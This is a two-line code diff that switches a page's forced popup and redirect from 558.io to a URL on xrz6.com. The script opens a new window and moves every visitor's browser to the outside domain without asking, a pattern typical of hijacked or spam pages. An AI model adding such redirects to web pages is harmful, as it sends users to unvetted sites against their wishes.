@@ -1,2 +1,2 @@
-window.open ("http://www.558.io/");
-window.location.href="http://558.io/"; 
+ window.open ("http://www.xrz6.com/#20161h"); 
+ window.location.href="http://www.xrz6.com/#20161h"; 
